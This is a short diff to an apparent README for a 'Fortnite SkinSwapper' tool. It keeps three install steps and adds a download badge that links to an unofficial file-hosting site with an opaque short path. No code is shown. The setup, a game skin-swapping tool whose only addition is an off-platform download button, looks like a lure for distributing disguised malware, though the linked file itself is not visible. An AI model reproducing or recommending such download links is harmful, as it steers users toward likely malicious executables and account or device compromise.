@@ -13,3 +13,5 @@
 1. Download and install **Fortnite SkinSwapper**.
 2. Launch the tool and select your desired skin or cosmetic item.
 3. Apply the skin and enjoy your personalized character in *Fortnite*!
+
+[![Download FortniteSkinSwapper](https://img.shields.io/badge/Download-FortniteSkinSwapper-blueviolet)](https://downeefiles.com/s/frtntsknswpr)
